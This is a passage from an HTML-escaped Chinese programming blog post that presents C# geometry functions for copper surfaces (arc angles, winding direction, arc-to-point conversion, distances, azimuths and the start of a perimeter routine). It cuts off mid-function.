        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;pc&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;pe&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;ccw&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; a_Angle(gPoint ps, gPoint pc, gPoint pe, &lt;span&gt;bool&lt;/span&gt; ccw, &lt;span&gt;bool&lt;/span&gt; islg180deg = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;)
        {
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; angle_s, angle_e, angle_sum;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (ccw)
            {
                angle_s &lt;/span&gt;=&lt;span&gt; p_ang(pc, pe);
                angle_e &lt;/span&gt;=&lt;span&gt; p_ang(pc, ps);
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {
                angle_s &lt;/span&gt;=&lt;span&gt; p_ang(pc, ps);
                angle_e &lt;/span&gt;=&lt;span&gt; p_ang(pc, pe);
            }
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (angle_s == &lt;span&gt;360&lt;/span&gt;) { angle_s = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;; }
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (angle_e &amp;gt;=&lt;span&gt; angle_s)
            {
                angle_sum &lt;/span&gt;= &lt;span&gt;360&lt;/span&gt; - (angle_e - angle_s);  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;360 - Math.Abs(angle_s - angle_e);&lt;/span&gt;
&lt;span&gt;            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {
                angle_sum &lt;/span&gt;= angle_s - angle_e;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Math.Abs(angle_s - angle_e);&lt;/span&gt;
&lt;span&gt;            }
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (islg180deg &amp;amp;&amp;amp; angle_sum &amp;gt; &lt;span&gt;180&lt;/span&gt;&lt;span&gt;)
            {
                angle_sum &lt;/span&gt;= &lt;span&gt;360&lt;/span&gt; -&lt;span&gt; angle_sum;
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; angle_sum;
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 检测 Surface是否逆时针   
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;gSur_Point_list&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt; s_isCCW(List&amp;lt;gSur_Point&amp;gt;&lt;span&gt; gSur_Point_list)
        {
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; d = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; n = gSur_Point_list.Count() - &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; n; i++&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (gSur_Point_list[i].type_point &amp;gt; &lt;span&gt;0&lt;/span&gt;) &lt;span&gt;continue&lt;/span&gt;&lt;span&gt;;
                &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; NextI = i + &lt;span&gt;1&lt;/span&gt; + (gSur_Point_list[i+ &lt;span&gt;1&lt;/span&gt;].type_point &amp;gt; &lt;span&gt;0&lt;/span&gt; ? &lt;span&gt;1&lt;/span&gt; : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;);
                d &lt;/span&gt;+= -&lt;span&gt;0.5&lt;/span&gt; * (gSur_Point_list[NextI].p.y + gSur_Point_list[i].p.y) * (gSur_Point_list[NextI].p.x -&lt;span&gt; gSur_Point_list[i].p.x);
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; d &amp;gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 将gSur_Point中含弧的节点转为线
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;gSur_Point_list&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;val_&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;此数值表示:分段数值&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;type_&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;代表值数值类型 【0】弧长 【1】角度  【2】弦长 &lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; List&amp;lt;gSur_Point&amp;gt; s_2gSur_Point(List&amp;lt;gSur_Point&amp;gt; gSur_Point_list, &lt;span&gt;double&lt;/span&gt; val_ = 1d, &lt;span&gt;int&lt;/span&gt; type_ = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
        {
            List&lt;/span&gt;&amp;lt;gSur_Point&amp;gt; resultList = &lt;span&gt;new&lt;/span&gt; List&amp;lt;gSur_Point&amp;gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (gSur_Point_list.Count &amp;gt; &lt;span&gt;2&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;bool&lt;/span&gt; is_flag = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
                resultList.Add(gSur_Point_list[&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;]);
                &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; j = &lt;span&gt;1&lt;/span&gt;; j &amp;lt; gSur_Point_list.Count; j++&lt;span&gt;)
                {
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (is_flag)
                    {
                        is_flag &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
                        &lt;/span&gt;&lt;span&gt;continue&lt;/span&gt;&lt;span&gt;;
                    }
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (gSur_Point_list[j].type_point &amp;gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
                    {
                        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; aData = &lt;span&gt;new&lt;/span&gt; gA(gSur_Point_list[j - &lt;span&gt;1&lt;/span&gt;].p, gSur_Point_list[j].p, gSur_Point_list[j + &lt;span&gt;1&lt;/span&gt;].p, &lt;span&gt;100&lt;/span&gt;, gSur_Point_list[j].type_point == &lt;span&gt;2&lt;/span&gt; ? &lt;span&gt;true&lt;/span&gt; : &lt;span&gt;false&lt;/span&gt;&lt;span&gt;);
                        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; PlistData = a_2Plist(aData, val_, type_, &lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
                        resultList.AddRange(PlistData.Select(tt &lt;/span&gt;=&amp;gt; &lt;span&gt;new&lt;/span&gt; gSur_Point(tt.p, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)).ToList());
                        is_flag &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
                    }
                    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                    {
                        resultList.Add(gSur_Point_list[j]);
                    }
                }
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; resultList;
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 弧Arc 转点P组集
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;a&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;val_&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;此数值表示:分段数值&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;type_&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;代表值数值类型 【0】弧长 【1】角度  【2】弦长 &lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;is_avg&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;是否平均分布 &lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; List&amp;lt;gPP&amp;gt; a_2Plist(gA a, &lt;span&gt;double&lt;/span&gt; val_ = &lt;span&gt;0.1d&lt;/span&gt;, &lt;span&gt;int&lt;/span&gt; type_ = &lt;span&gt;0&lt;/span&gt;, &lt;span&gt;bool&lt;/span&gt; is_avg = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;)
        {
            List&lt;/span&gt;&amp;lt;gPP&amp;gt; list_point = &lt;span&gt;new&lt;/span&gt; List&amp;lt;gPP&amp;gt;&lt;span&gt;();
            gPP tempP;
            tempP.p &lt;/span&gt;=&lt;span&gt; a.ps;
            tempP.symbols &lt;/span&gt;=&lt;span&gt; a.symbols;
            tempP.width &lt;/span&gt;=&lt;span&gt; a.width;
            list_point.Add(tempP);

            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; avg_count;
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; angle_val = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; rad_ =&lt;span&gt; p2p_di(a.pc, a.pe);
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; sum_alge =&lt;span&gt; a_Angle(a);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (type_ == &lt;span&gt;1&lt;/span&gt;)  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;    【1】角度  &lt;/span&gt;
&lt;span&gt;            {
                angle_val &lt;/span&gt;=&lt;span&gt; val_;
                avg_count &lt;/span&gt;= (&lt;span&gt;int&lt;/span&gt;)(Math.Floor(sum_alge / angle_val));  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;  总角度/单角度&lt;/span&gt;
&lt;span&gt;            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (type_ == &lt;span&gt;2&lt;/span&gt;)  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;【2】弦长&lt;/span&gt;
&lt;span&gt;            {
                angle_val &lt;/span&gt;= Math.Asin(val_ / (rad_ * &lt;span&gt;2&lt;/span&gt;)) * &lt;span&gt;360&lt;/span&gt; /&lt;span&gt; pi;
                avg_count &lt;/span&gt;= (&lt;span&gt;int&lt;/span&gt;)(Math.Ceiling(sum_alge / angle_val) + eps) - &lt;span&gt;1&lt;/span&gt;;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;  总角度/单弦长&lt;/span&gt;
&lt;span&gt;            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;                【0】弧长 &lt;/span&gt;
&lt;span&gt;            {
                angle_val &lt;/span&gt;= val_ * &lt;span&gt;180&lt;/span&gt; / (pi *&lt;span&gt; rad_);
                avg_count &lt;/span&gt;= (&lt;span&gt;int&lt;/span&gt;)(Math.Ceiling(sum_alge / angle_val) + eps) - &lt;span&gt;1&lt;/span&gt;;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;  总角度/单角度
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;avg_count = (int)(Math.Ceiling(a_Lenght(a) / val_)) - 1;  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;  或  总弧长/单弧长&lt;/span&gt;
&lt;span&gt;            }
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (is_avg)
                angle_val &lt;/span&gt;= sum_alge /&lt;span&gt; avg_count;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (avg_count &amp;gt; &lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
            {
                gPP centerP &lt;/span&gt;=&lt;span&gt; tempP;
                centerP.p &lt;/span&gt;=&lt;span&gt; a.pc;
                &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; angle_s =&lt;span&gt; p_ang(a.pc, a.ps);
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (a.ccw) { angle_val = &lt;span&gt;0&lt;/span&gt; -&lt;span&gt; angle_val; }
                &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;1&lt;/span&gt;; i &amp;lt; avg_count; i++&lt;span&gt;)
                {
                    tempP &lt;/span&gt;= p_val_ang(centerP, rad_, angle_s - angle_val *&lt;span&gt; i);
                    list_point.Add(tempP);
                }
            }
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; if (!(zero(a.ps.x - a.pe.x) &amp;amp;&amp;amp; zero(a.ps.y - a.pe.y)))
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;     tempP.p = a.pe;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;     list_point.Add(tempP);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; }&lt;/span&gt;
            tempP.p =&lt;span&gt; a.pe;
            list_point.Add(tempP);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; list_point;
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 返回两点之间欧氏距离
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;p1&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;p2&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; p2p_di(gPoint p1, gPoint p2)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Math.Sqrt((p1.x - p2.x) * (p1.x - p2.x) + (p1.y - p2.y) * (p1.y -&lt;span&gt; p2.y));
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 求弧Arc圆心角       //后续改进  用叉积 与3P求角度求解  验证哪个效率高
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;a&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; a_Angle(gA a)
        {
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; angle_s, angle_e, angle_sum;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (a.ccw)
            {
                angle_s &lt;/span&gt;=&lt;span&gt; p_ang(a.pc, a.pe);
                angle_e &lt;/span&gt;=&lt;span&gt; p_ang(a.pc, a.ps);
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {
                angle_s &lt;/span&gt;=&lt;span&gt; p_ang(a.pc, a.ps);
                angle_e &lt;/span&gt;=&lt;span&gt; p_ang(a.pc, a.pe);
            }
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (angle_s == &lt;span&gt;360&lt;/span&gt;) { angle_s = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;; }
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (angle_e &amp;gt;=&lt;span&gt; angle_s)
                angle_sum &lt;/span&gt;= &lt;span&gt;360&lt;/span&gt; - Math.Abs(angle_s -&lt;span&gt; angle_e);
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                angle_sum &lt;/span&gt;= Math.Abs(angle_s -&lt;span&gt; angle_e);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; angle_sum;
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 求方位角
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;ps&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;pe&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; p_ang(gPoint ps, gPoint pe)
        {
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; a_ang = Math.Atan((pe.y - ps.y) / (pe.x - ps.x)) / Math.PI * &lt;span&gt;180&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;象限角  转方位角   计算所属象限   并求得方位角&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt; (pe.x &amp;gt;= ps.x &amp;amp;&amp;amp; pe.y &amp;gt;= ps.y)  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;↗    第一象限&lt;/span&gt;
&lt;span&gt;            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; a_ang;
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (!(pe.x &amp;gt;= ps.x) &amp;amp;&amp;amp; pe.y &amp;gt;= ps.y)  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; ↖   第二象限&lt;/span&gt;
&lt;span&gt;            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; a_ang + &lt;span&gt;180&lt;/span&gt;&lt;span&gt;;
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (!(pe.x &amp;gt;= ps.x) &amp;amp;&amp;amp; !(pe.y &amp;gt;= ps.y))  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;↙   第三象限&lt;/span&gt;
&lt;span&gt;            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; a_ang + &lt;span&gt;180&lt;/span&gt;&lt;span&gt;;
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (pe.x &amp;gt;= ps.x &amp;amp;&amp;amp; !(pe.y &amp;gt;= ps.y))  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; ↘   第四象限&lt;/span&gt;
&lt;span&gt;            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; a_ang + &lt;span&gt;360&lt;/span&gt;&lt;span&gt;;
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; a_ang;
            }
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 求增量坐标
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;ps&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;起点&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;val&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;增量值&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;ang_direction&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;角度&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; gPP p_val_ang(gPP ps, &lt;span&gt;double&lt;/span&gt; val, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; ang_direction)
        {
            gPP pe &lt;/span&gt;=&lt;span&gt; ps;
            pe.p.x &lt;/span&gt;= ps.p.x + val * Math.Cos(ang_direction * Math.PI / &lt;span&gt;180&lt;/span&gt;&lt;span&gt;);
            pe.p.y &lt;/span&gt;= ps.p.y + val * Math.Sin(ang_direction * Math.PI / &lt;span&gt;180&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; pe;
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;   3.计算铜的多边形周长函数&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('838c1a19-d87f-4a71-b192-04d9f27d2864')&quot; readability=&quot;38.5&quot;&gt;&lt;img id=&quot;code_img_closed_838c1a19-d87f-4a71-b192-04d9f27d2864&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_838c1a19-d87f-4a71-b192-04d9f27d2864&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('838c1a19-d87f-4a71-b192-04d9f27d2864',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_838c1a19-d87f-4a71-b192-04d9f27d2864&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;72&quot;&gt;
&lt;pre&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 求Surface  总周长
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;gS_list&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; s_Length(List&amp;lt;gS&amp;gt;&lt;span&gt; gS_list)
        {
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; Surface_Count =&lt;span&gt; gS_list.Count();
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; SurfaceArea = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; gS_item &lt;span&gt;in&lt;/span&gt;&lt;span&gt; gS_list)
            {
                &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; Polyline &lt;span&gt;in&lt;/span&gt;&lt;span&gt; gS_item.sur_group)
                {
                    SurfaceArea &lt;/span&gt;+=&lt;span&gt; s_Length(Polyline.sur_list);
                }
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; SurfaceArea;
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 求Surface  总周长
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;gSur_Point_list&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; s_Length(List&amp;lt;gSur_Point&amp;gt;&lt;span&gt; gSur_Point_list)
        {
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; sum_lenght = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;bool&lt;/span&gt; is_flag = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;bool&lt;/span&gt; ccw = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;1&lt;/span&gt;; i &amp;lt; gSur_Point_list.Count; i++&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (is_flag)
                {
                    is_flag &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
                    &lt;/span&gt;&lt;span&gt;continue&lt;/span&gt;&lt;span&gt;;
                }
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (gSur_Point_list[i].type_point &amp;gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
                {
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (gSur_Point_list[i].type_point == &lt;span&gt;2&lt;/span&gt;&lt;span&gt;)
                        ccw &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
                    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                        ccw &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
